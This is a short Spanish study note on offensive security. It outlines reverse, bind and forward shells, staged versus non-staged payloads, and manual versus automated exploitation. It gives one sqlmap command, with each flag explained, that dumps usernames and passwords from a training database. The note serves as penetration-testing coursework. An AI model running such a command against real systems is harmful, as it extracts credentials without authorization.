#### reverse shell, bind shell, y forward shell
se enumeran las diferencias entre  [[reverse shell]], [[bind shell]] y [[forward shell]]

#### tipos de payloads
[[payload staged]] y [[payload non-staged]]

Es importante tener en cuenta que el tipo de payload utilizado en un ataque dependerá del objetivo y de las medidas de seguridad implementadas. En general, los payloads Staged son más difíciles de detectar y son preferidos por los atacantes, mientras que los payloads Non-Staged son más fáciles de implementar pero también son más fáciles de detectar.

#### tipos de explotacion: manual y automatizadas
[[explotacion manual]]
[[explotacion automatizada]]

por ejemplo se puede hacer uso de la siguiente explotacion automatizada con sqlmap:
```bash
sqlmap -r request.req -p searchitem --batch -D sqltraining -T users -C username, password --dump
```
- `-r request.req` → usa una request HTTP real capturada
- `-p searchitem` → inyecta solo en el parámetro `searchitem`
- `--batch` → responde “sí” a todo automáticamente
- `-D sqltraining` → base de datos objetivo
- `-T users` → tabla objetivo
- `-C username,password` → columnas a extraer
- `--dump` → muestra los datos